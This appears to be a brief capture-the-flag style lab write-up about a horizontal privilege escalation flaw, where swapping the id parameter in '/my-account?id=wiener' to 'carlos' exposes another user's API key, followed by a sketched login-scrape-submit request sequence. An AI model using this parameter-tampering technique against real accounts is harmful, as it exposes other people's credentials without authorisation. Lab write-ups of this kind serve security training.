This lab has a horizontal privilege escalation vulnerability on the user account page.

To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.

You can log in to your own account using the following credentials: `wiener:peter`

---

Goal: obtain api key for carlos

My account page has a vulnerable id parameter allowing me to change user by simply changing: `/my-account?id=wiener` to `/my-account?id=carlos`

script details

POST /login
- User data
GET /my-account?id=carlos
- grab with soup: `Your API Key is: ZcDIi1RVndT5rEntdTV9nCsmKRnd05mA`
POST /submitSolution
- Data: `answer=ZcDIi1RVndT5rEntdTV9nCsmKRnd05mA`

